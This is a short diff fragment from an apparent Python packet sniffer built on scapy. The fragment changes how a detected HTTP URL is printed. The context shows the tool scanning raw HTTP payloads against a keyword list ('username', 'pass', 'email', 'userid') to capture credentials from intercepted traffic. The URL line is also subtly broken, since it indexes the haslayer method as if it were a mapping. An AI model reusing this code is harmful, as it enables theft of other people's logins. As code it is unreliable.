@@ -27,7 +27,7 @@ def snf (interf, stor):
 def paket(paket):
     if paket.haslayer(http.HTTPRequest):
         httpurl = paket.haslayer[http.HTTPRequest].Host + paket.haslayer[http.HTTPRequest].Path
-        print("[Info] --> HTTP URL Detected: "+httpurl)
+        print("[Info] --> HTTP URL Detected: "+str(httpurl))
         if paket.haslayer(sc.Raw):
             cred = paket[sc.Raw].load
             keyws = ["uname", "username", "Username", "Email", "Emails", "email", "emails", "pass", "pasw", "id", "userid"]
